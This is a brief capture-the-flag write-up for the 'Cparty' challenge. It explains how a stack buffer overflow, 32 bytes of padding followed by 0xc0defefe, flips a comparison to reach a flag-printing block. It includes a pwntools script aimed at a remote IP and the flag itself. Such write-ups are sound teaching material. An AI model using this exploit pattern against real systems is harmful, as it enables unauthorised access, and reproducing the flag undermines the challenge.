# Cparty

![](./img/1.png#center)

To start I connect to the server to see what it asks me :

![](./img/2.png#center)

So I need to find a password. I will look the file with binaryninja.

![](./img/3.png#center)

As you can see, in order to retrieve the flag, we need to find ourselves in the block where there is the « cat /home/party/flag ». And just before this block we can see the comparison in order to enter this block :

![](./img/4.png#center)

Using this buffer is therefore very simple, we just have to find the size of our buffer then add the address 0xc0defefe so that the comparison is true and we can have the flag.

To use this vulnerability we need :

## Padding + 0xc0defefe

After a while, I arrived at 32 in padding.

Now that we have everything we juste need a script to automate the pwn :

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

p = remote("89.38.210.128", 31338)

p.send("A"*32+p32(0xc0defefe))

p.recv(1024)

p.interactive()

#timctf{d0nt_cr4sh_th3_p4rty_b3_th3_p4rty}
```

![](./img/5.png#center)